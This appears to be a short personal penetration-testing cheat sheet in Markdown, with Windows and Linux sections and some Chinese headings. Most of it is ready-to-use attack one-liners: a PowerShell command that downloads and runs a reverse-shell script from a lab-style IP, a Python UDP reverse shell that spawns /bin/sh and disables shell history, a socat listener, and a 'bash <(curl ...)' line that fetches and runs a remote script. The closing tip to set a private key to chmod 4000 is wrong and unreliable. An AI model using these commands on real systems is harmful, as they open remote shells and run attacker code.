# Windows

## List services

`wmic service where started=true get name, startname`

## Powershell reverse

`IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')`

# Linux

## Reverse shells

* `socat file:’tty’,echo=0,raw udp-listen:4444`
* `import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.16.28\", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])`

## Get remote script and execute

`bash <(curl -s http://mywebsite.com/myscript.txt)`

## Find exclude specific words

`find / -type f -name "filename" 2>&1 | grep -v "Permission denied`
## ssh

### 使用 private key 登录

![AxtqoR.png](https://s2.ax1x.com/2019/04/16/AxtqoR.png)

修改 private key 权限，`chmod 4000`
